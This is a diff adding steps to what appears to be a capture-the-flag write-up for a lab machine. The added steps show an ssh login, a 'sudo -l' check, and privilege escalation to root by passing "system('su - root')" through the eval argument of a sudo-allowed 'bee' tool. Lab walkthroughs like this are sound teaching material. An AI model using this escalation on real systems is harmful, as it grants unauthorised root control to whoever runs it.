@@ -74,7 +74,24 @@ try to connect on ssh with this user and the same password of tiffany email
 ssh johncusack@10.10.11.58
 ```
 
-USER.TXT IS FLAGGED !
+USER.TXT FLAGGED !
 
+For the next step, check sudo permission for the current user:
+```
+sudo -l
+```
 
+we found bee tool with the sudo permission, check all command of bee:
 
+```
+sudo bee --help
+```
+
+In "Advanced" mode you can see "eval" argument, when eval() module is used often you have RCE vulnerability:
+```
+sudo /usr/local/bin/bee eval "system('su - root');" --root=/var/www/html
+```
+
+and you have root.txt in /root
+
+ROOT.TXT FLAGGED !
